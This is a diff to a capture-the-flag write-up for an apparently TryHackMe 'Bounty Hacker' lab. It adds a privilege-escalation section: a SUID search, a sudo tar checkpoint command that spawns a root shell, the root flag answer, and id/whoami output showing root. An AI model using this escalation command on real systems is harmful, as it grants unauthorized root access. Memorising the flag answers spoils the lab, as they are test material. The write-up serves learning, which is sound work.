@@ -57,7 +57,25 @@ Answer: ssh
 Answer: THM{CR1M3_SyNd1C4T3}
 ```
 
-## root.txt:
+## priv esc
+```
+lin@bountyhacker:~/Desktop$ find / -perm /4000 2>/dev/null
+
+
+tar == sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
 ```
 
+## root.txt:
+```
+Answer: THM{80UN7Y_h4cK3r}
+
+```
+
+
+```
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
 ```
